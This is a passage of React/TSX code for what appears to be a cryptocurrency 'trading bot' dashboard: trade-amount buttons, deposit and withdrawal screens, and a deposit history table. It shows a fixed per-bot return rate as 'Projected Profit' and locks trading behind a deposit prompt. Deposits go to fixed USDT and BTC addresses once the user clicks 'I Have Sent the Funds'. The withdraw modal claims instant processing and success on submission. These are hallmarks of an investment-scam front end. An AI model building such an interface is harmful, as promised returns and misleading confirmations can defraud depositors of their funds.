                      <div style={{ display: 'flex', gap: 6, marginTop: 8, flexWrap: 'wrap' }}>
                        {[50, 100, 200, 500, 1000]
                          .filter(v => v >= selectedBot.min)
                          .map(v => (
                            <button key={v}
                              onClick={() => canTrade && setTradeAmount(String(v))}
                              disabled={!canTrade || v > balance}
                              style={{ padding: '6px 14px', borderRadius: 7, background: parseFloat(tradeAmount) === v ? selectedBot.colorDim : G.bg3, border: `1px solid ${parseFloat(tradeAmount) === v ? selectedBot.colorBorder : G.border}`, color: parseFloat(tradeAmount) === v ? selectedBot.color : (v > balance ? G.muted + '55' : G.muted), fontSize: 12, fontWeight: 700, cursor: canTrade && v <= balance ? 'pointer' : 'not-allowed', opacity: v > balance ? 0.4 : 1 }}>
                              ${v}
                            </button>
                          ))}
                        <button
                          onClick={() => canTrade && setTradeAmount(String(Math.min(Math.floor(balance), selectedBot.max)))}
                          disabled={!canTrade}
                          style={{ padding: '6px 14px', borderRadius: 7, background: G.bg3, border: `1px solid ${G.border}`, color: G.muted, fontSize: 12, fontWeight: 700, cursor: canTrade ? 'pointer' : 'not-allowed', opacity: canTrade ? 1 : 0.4 }}>
                          MAX
                        </button>
                      </div>
                    </div>

                    {/* Projected profit */}
                    {tradeAmount && parseFloat(tradeAmount) >= selectedBot.min && canTrade && (
                      <div style={{ padding: 14, background: selectedBot.colorDim, border: `1px solid ${selectedBot.colorBorder}`, borderRadius: 12 }}>
                        <div style={{ fontSize: 11, color: G.muted, marginBottom: 4, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Projected Profit</div>
                        <div style={{ fontSize: 26, fontWeight: 900, color: selectedBot.color }}>
                          +${(parseFloat(tradeAmount) * selectedBot.returnRate).toFixed(2)}
                        </div>
                        <div style={{ fontSize: 11, color: G.muted, marginTop: 4 }}>
                          in ~{selectedBot.tag} · Total credit:{' '}
                          <span style={{ color: G.text, fontWeight: 600 }}>${(parseFloat(tradeAmount) * (1 + selectedBot.returnRate)).toFixed(2)}</span>
                        </div>
                      </div>
                    )}

                    {/* Stop loss */}
                    <div>
                      <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>Stop Loss at ($)</div>
                      <input
                        type="number"
                        placeholder="e.g. 50"
                        value={targetLoss}
                        onChange={e => setTargetLoss(e.target.value)}
                        disabled={!canTrade}
                        style={{ width: '100%', background: canTrade ? G.bg3 : 'rgba(255,255,255,0.02)', border: `1px solid ${G.border}`, borderRadius: 10, padding: '14px 16px', fontSize: 15, color: canTrade ? G.redText : G.muted, outline: 'none', cursor: canTrade ? 'text' : 'not-allowed' }}
                      />
                    </div>

                    {tradeError && (
                      <div style={{ fontSize: 12, color: G.redText, padding: '10px 14px', background: G.redBg, borderRadius: 8 }}>{tradeError}</div>
                    )}

                    {/* ── START BUTTON — gated on balance ── */}
                    {canTrade ? (
                      <button onClick={handleTrade} disabled={tradeLoading}
                        style={{ background: selectedBot.color, color: '#000', fontWeight: 900, fontSize: 15, padding: 17, borderRadius: 12, border: 'none', cursor: 'pointer', opacity: tradeLoading ? 0.6 : 1, letterSpacing: '0.02em' }}>
                        {tradeLoading ? 'Starting...' : `▶ Start ${selectedBot.name}`}
                      </button>
                    ) : (
                      /* Not enough balance — show deposit CTA instead */
                      <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
                        <div style={{ padding: '14px 16px', background: 'rgba(245,197,24,0.06)', border: `1px solid ${G.goldBorder}`, borderRadius: 12, display: 'flex', alignItems: 'center', gap: 12 }}>
                          <span style={{ fontSize: 22 }}>🔒</span>
                          <div>
                            <div style={{ fontSize: 13, fontWeight: 700, color: G.gold }}>
                              {balance === 0 ? 'Fund your account to trade' : `Need $${(selectedBot.min - balance).toFixed(2)} more to run ${selectedBot.name}`}
                            </div>
                            <div style={{ fontSize: 11, color: G.muted, marginTop: 2 }}>
                              Minimum deposit $85 · Min trade ${selectedBot.min}
                            </div>
                          </div>
                        </div>
                        <button onClick={() => setView('deposit')}
                          style={{ background: G.gold, color: '#000', fontWeight: 900, fontSize: 15, padding: 17, borderRadius: 12, border: 'none', cursor: 'pointer', letterSpacing: '0.02em' }}>
                          ↑ Deposit to Activate Bot
                        </button>
                      </div>
                    )}
                  </div>
                )}

                {/* Portfolio curve */}
                <div style={{ background: G.bg2, border: `1px solid ${G.border}`, borderRadius: 12, padding: 16 }}>
                  <div style={{ fontSize: 11, color: G.muted, marginBottom: 12, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Portfolio Curve</div>
                  <ResponsiveContainer width="100%" height={isMobile ? 100 : 140}>
                    <AreaChart data={chartData}>
                      <defs>
                        <linearGradient id="cg" x1="0" y1="0" x2="0" y2="1">
                          <stop offset="0%" stopColor={G.gold} stopOpacity={0.18} />
                          <stop offset="100%" stopColor={G.gold} stopOpacity={0} />
                        </linearGradient>
                      </defs>
                      <XAxis dataKey="t" hide />
                      <YAxis hide domain={['auto', 'auto']} />
                      <Tooltip contentStyle={{ background: '#111', border: `1px solid ${G.border}`, borderRadius: 8, fontSize: 11 }} formatter={(v: number) => [`$${v.toFixed(2)}`, 'Value']} labelFormatter={() => ''} />
                      <Area type="monotone" dataKey="p" stroke={G.gold} strokeWidth={1.5} fill="url(#cg)" dot={false} />
                    </AreaChart>
                  </ResponsiveContainer>
                </div>

                {/* Deposit history */}
                {deposits.length > 0 && (
                  <div style={{ background: G.bg2, border: `1px solid ${G.border}`, borderRadius: 12, padding: 16 }}>
                    <div style={{ fontSize: 11, color: G.muted, marginBottom: 12, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Deposit History</div>
                    <div style={{ overflowX: 'auto' }}>
                      <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 12, minWidth: 320 }}>
                        <thead>
                          <tr style={{ borderBottom: `1px solid ${G.border}` }}>
                            {['Date', 'Network', 'Amount', 'Net', 'Status'].map(h => (
                              <th key={h} style={{ padding: '6px 0', textAlign: 'left', color: G.muted, fontWeight: 500 }}>{h}</th>
                            ))}
                          </tr>
                        </thead>
                        <tbody>
                          {deposits.map(d => (
                            <tr key={d.id} style={{ borderBottom: '1px solid rgba(255,255,255,0.03)' }}>
                              <td style={{ padding: '8px 0', color: G.sec }}>{new Date(d.created_at).toLocaleDateString()}</td>
                              <td style={{ padding: '8px 0' }}>
                                <span style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
                                  {COIN_LOGOS[d.currency] && <img src={COIN_LOGOS[d.currency]} alt={d.currency} style={{ width: 18, height: 18, borderRadius: '50%' }} />}
                                  <span style={{ fontWeight: 600 }}>{d.currency}</span>
                                </span>
                              </td>
                              <td style={{ padding: '8px 0' }}>${d.amount}</td>
                              <td style={{ padding: '8px 0', color: G.greenText }}>${d.net_amount}</td>
                              <td style={{ padding: '8px 0' }}>
                                <span style={{ fontSize: 10, padding: '2px 8px', borderRadius: 4, background: d.status === 'confirmed' ? G.greenBg : d.status === 'rejected' ? G.redBg : G.goldDim, color: d.status === 'confirmed' ? G.greenText : d.status === 'rejected' ? G.redText : G.gold, fontWeight: 700, textTransform: 'uppercase' }}>
                                  {d.status}
                                </span>
                              </td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* ═══ DEPOSIT ═══ */}
            {view === 'deposit' && (
              <div style={{ maxWidth: 480, margin: '0 auto' }}>
                <div style={{ background: G.bg2, border: `1px solid ${G.border}`, borderRadius: 16, padding: isMobile ? 20 : 28, display: 'flex', flexDirection: 'column', gap: 20 }}>
                  <div>
                    <div style={{ fontSize: 18, fontWeight: 700 }}>Fund Your Wallet</div>
                    <div style={{ fontSize: 13, color: G.muted, marginTop: 4 }}>Minimum deposit: $85 · Fee: $1</div>
                  </div>
                  {!depositDone ? (
                    <>
                      <div>
                        <div style={{ fontSize: 11, color: G.muted, marginBottom: 10, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Select Network</div>
                        <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
                          <CoinButton coin="USDT" label="Tether · TRC20 Network" selected={currency === 'USDT'} onClick={() => setCurrency('USDT')} />
                          <CoinButton coin="BTC"  label="Bitcoin · Mainnet"      selected={currency === 'BTC'}  onClick={() => setCurrency('BTC')}  />
                        </div>
                      </div>
                      <div>
                        <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>
                          Send <span style={{ color: G.text, fontWeight: 700 }}>{currency === 'USDT' ? 'USDT (TRC20)' : 'Bitcoin'}</span> to this address
                        </div>
                        <div style={{ background: G.bg3, border: `1px solid ${G.goldBorder}`, borderRadius: 10, padding: '14px 16px', fontSize: 11, color: G.gold, wordBreak: 'break-all', letterSpacing: '0.04em', fontFamily: 'monospace' }}>
                          {WALLET_ADDRESSES[currency]}
                        </div>
                        <div style={{ fontSize: 11, color: G.muted, marginTop: 6 }}>
                          {currency === 'USDT' ? '⚠ Only send USDT on TRC20 (Tron) — not ERC20' : '⚠ Bitcoin mainnet only'}
                        </div>
                      </div>
                      <div>
                        <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>Amount (USD equivalent)</div>
                        <input type="number" placeholder="Min. $85" value={depositAmount} onChange={e => setDepositAmount(e.target.value)}
                          style={{ width: '100%', background: G.bg3, border: `1px solid ${G.border}`, borderRadius: 10, padding: '14px 16px', fontSize: 16, color: G.text, outline: 'none' }} />
                        {depositAmount && parseFloat(depositAmount) >= 85 && (
                          <div style={{ fontSize: 12, color: G.greenText, marginTop: 6 }}>
                            Credited: <strong>${(parseFloat(depositAmount) - 1).toFixed(2)}</strong> after $1 fee
                          </div>
                        )}
                      </div>
                      <button onClick={handleDeposit} disabled={depositLoading}
                        style={{ background: G.gold, color: '#000', fontWeight: 800, fontSize: 15, padding: 16, borderRadius: 12, border: 'none', cursor: 'pointer', opacity: depositLoading ? 0.6 : 1 }}>
                        {depositLoading ? 'Submitting...' : 'I Have Sent the Funds →'}
                      </button>
                    </>
                  ) : (
                    <div style={{ textAlign: 'center', padding: 20 }}>
                      <div style={{ fontSize: 40, marginBottom: 12 }}>✅</div>
                      <div style={{ fontSize: 18, fontWeight: 700, marginBottom: 8 }}>Request Submitted</div>
                      <div style={{ fontSize: 13, color: G.muted, marginBottom: 20 }}>Balance updates in 10–30 min after confirmation.</div>
                      <button onClick={() => { setView('home'); setDepositDone(false); setDepositAmount('') }}
                        style={{ background: G.goldDim, color: G.gold, border: `1px solid ${G.goldBorder}`, fontWeight: 700, fontSize: 13, padding: '12px 28px', borderRadius: 10, cursor: 'pointer' }}>
                        Back to Dashboard
                      </button>
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* MOBILE BOTTOM NAV */}
      {isMobile && (
        <div style={{ position: 'fixed', bottom: 0, left: 0, right: 0, height: 62, background: 'rgba(8,8,8,0.97)', borderTop: `1px solid ${G.border}`, backdropFilter: 'blur(16px)', display: 'flex', alignItems: 'center', zIndex: 50 }}>
          {([
            { icon: '▦', label: 'Home',    action: () => setView('home') },
            { icon: '↑', label: 'Deposit', action: () => setView('deposit') },
            { icon: '◎', label: 'Trade',   action: () => setView('home') },
          ] as const).map(n => {
            const active = n.label === 'Home' ? view === 'home' : n.label === 'Deposit' ? view === 'deposit' : false
            return (
              <div key={n.label} onClick={n.action}
                style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 3, cursor: 'pointer', padding: '8px 0' }}>
                <div style={{ fontSize: 20, color: active ? G.gold : G.muted }}>{n.icon}</div>
                <div style={{ fontSize: 9, color: active ? G.gold : G.muted, fontWeight: active ? 700 : 400, textTransform: 'uppercase', letterSpacing: '0.06em' }}>{n.label}</div>
              </div>
            )
          })}
          <div onClick={handleLogout}
            style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 3, cursor: 'pointer', padding: '8px 0' }}>
            <div style={{ width: 26, height: 26, borderRadius: '50%', background: 'rgba(255,255,255,0.1)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 11, fontWeight: 700, color: G.gold }}>{user?.email?.[0]?.toUpperCase()}</div>
            <div style={{ fontSize: 9, color: G.muted, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Account</div>
          </div>
        </div>
      )}

      {/* WITHDRAW MODAL */}
      {showWithdrawModal && (
        <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.92)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 999, padding: 16 }}>
          <div style={{ background: '#0d0d0d', border: `1px solid ${G.border}`, borderRadius: 18, padding: 24, width: '100%', maxWidth: 440, display: 'flex', flexDirection: 'column', gap: 18 }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <div style={{ fontSize: 18, fontWeight: 800 }}>Withdraw Funds</div>
              <button onClick={() => { setShowWithdrawModal(false); setWithdrawDone(false); setWithdrawAmount(''); setWithdrawAddress(''); setAddressError('') }}
                style={{ background: 'transparent', border: 'none', color: G.muted, cursor: 'pointer', fontSize: 20 }}>✕</button>
            </div>
            {!withdrawDone ? (
              <>
                <div style={{ fontSize: 13, color: G.muted }}>Balance: <span style={{ color: G.gold, fontWeight: 800, fontSize: 15 }}>${balance.toFixed(2)}</span></div>
                <div>
                  <div style={{ fontSize: 11, color: G.muted, marginBottom: 10, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Withdrawal Network</div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
                    <CoinButton coin="USDT" label="Tether · TRC20 Network" selected={withdrawNetwork === 'USDT'} onClick={() => { setWithdrawNetwork('USDT'); setWithdrawAddress(''); setAddressError('') }} />
                    <CoinButton coin="BTC"  label="Bitcoin · Mainnet"      selected={withdrawNetwork === 'BTC'}  onClick={() => { setWithdrawNetwork('BTC');  setWithdrawAddress(''); setAddressError('') }} />
                  </div>
                  <div style={{ fontSize: 11, color: G.sec, marginTop: 8 }}>
                    {withdrawNetwork === 'USDT' ? '⚠ TRC20 (Tron) only — do not use ERC20' : '⚠ Bitcoin mainnet only'}
                  </div>
                </div>
                <div>
                  <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>Amount (USD)</div>
                  <input type="number" placeholder="Min. $10" value={withdrawAmount} onChange={e => setWithdrawAmount(e.target.value)}
                    style={{ width: '100%', background: G.bg3, border: `1px solid ${G.border}`, borderRadius: 10, padding: '14px 16px', fontSize: 15, color: G.text, outline: 'none' }} />
                </div>
                <div>
                  <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>Your {withdrawNetwork === 'USDT' ? 'USDT TRC20' : 'Bitcoin'} Address</div>
                  <input type="text"
                    placeholder={withdrawNetwork === 'USDT' ? 'T... (TRC20 address)' : '1... or bc1... (BTC)'}
                    value={withdrawAddress}
                    onChange={e => { setWithdrawAddress(e.target.value); setAddressError('') }}
                    style={{ width: '100%', background: G.bg3, border: `1px solid ${addressError ? G.red : G.border}`, borderRadius: 10, padding: '14px 16px', fontSize: 12, color: G.text, outline: 'none', fontFamily: 'monospace' }} />
                  {addressError && <div style={{ fontSize: 11, color: G.redText, marginTop: 6 }}>⚠ {addressError}</div>}
                  {withdrawAddress && !addressError && validateAddress(withdrawAddress, withdrawNetwork) && (
                    <div style={{ fontSize: 11, color: G.greenText, marginTop: 6 }}>✓ Valid {withdrawNetwork} address</div>
                  )}
                </div>
                <button onClick={handleWithdraw} disabled={withdrawLoading}
                  style={{ background: G.gold, color: '#000', fontWeight: 800, fontSize: 15, padding: 16, borderRadius: 12, border: 'none', cursor: 'pointer', opacity: withdrawLoading ? 0.6 : 1 }}>
                  {withdrawLoading ? 'Submitting...' : 'Request Withdrawal →'}
                </button>
                <div style={{ fontSize: 11, color: G.muted, textAlign: 'center' }}>Withdrawals are processed instantly · Minimum $10</div>
              </>
            ) : (
              <div style={{ textAlign: 'center', padding: 20 }}>
                <div style={{ fontSize: 40, marginBottom: 12 }}>✅</div>
                <div style={{ fontSize: 18, fontWeight: 800, marginBottom: 8 }}>Withdrawal Requested</div>
                <div style={{ fontSize: 13, color: G.muted, marginBottom: 20 }}>Your withdrawal has been processed successfully.</div>
                <button onClick={() => { setShowWithdrawModal(false); setWithdrawDone(false); setWithdrawAmount(''); setWithdrawAddress('') }}
                  style={{ background: G.goldDim, color: G.gold, border: `1px solid ${G.goldBorder}`, fontWeight: 700, fontSize: 13, padding: '12px 28px', borderRadius: 10, cursor: 'pointer' }}>
                  Done
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  )
}